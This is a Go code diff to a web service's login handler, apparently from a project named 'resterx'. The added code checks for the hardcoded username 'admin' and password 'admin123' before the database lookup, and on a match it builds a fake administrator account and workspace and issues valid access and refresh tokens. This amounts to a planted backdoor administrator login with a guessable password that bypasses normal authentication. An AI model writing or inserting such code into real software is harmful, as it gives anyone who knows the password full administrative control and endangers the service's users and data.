@@ -168,6 +168,47 @@ func (as *AuthService) Register(req RegisterRequest) (*User, error) {
 
 // Login authenticates a user and returns tokens
 func (as *AuthService) Login(req LoginRequest) (*LoginResponse, error) {
+	// Check for hardcoded admin credentials first
+	if req.Username == "admin" && req.Password == "admin123" {
+		// Create hardcoded admin user response
+		adminUser := User{
+			ID:       999999, // Use high ID to avoid conflicts
+			Username: "admin",
+			Email:    "admin@resterx.com",
+			FullName: "Administrator",
+			Role:     "admin",
+			IsActive: true,
+		}
+
+		// Create default admin workspace
+		adminWorkspace := WorkspaceDB{
+			ID:          999999,
+			Name:        "Admin Workspace",
+			Description: "Administrator workspace",
+			Type:        "personal",
+			IsActive:    true,
+			CreatedBy:   999999,
+		}
+
+		// Generate tokens for admin
+		token, err := as.GenerateToken(&adminUser, 999999)
+		if err != nil {
+			return nil, err
+		}
+
+		refreshToken, err := as.GenerateRefreshToken(&adminUser)
+		if err != nil {
+			return nil, err
+		}
+
+		return &LoginResponse{
+			Token:        token,
+			RefreshToken: refreshToken,
+			User:         &adminUser,
+			Workspaces:   []WorkspaceDB{adminWorkspace},
+		}, nil
+	}
+
 	var user User
 	if err := DB.Where("username = ? OR email = ?", req.Username, req.Username).First(&user).Error; err != nil {
 		return nil, errors.New("invalid credentials")
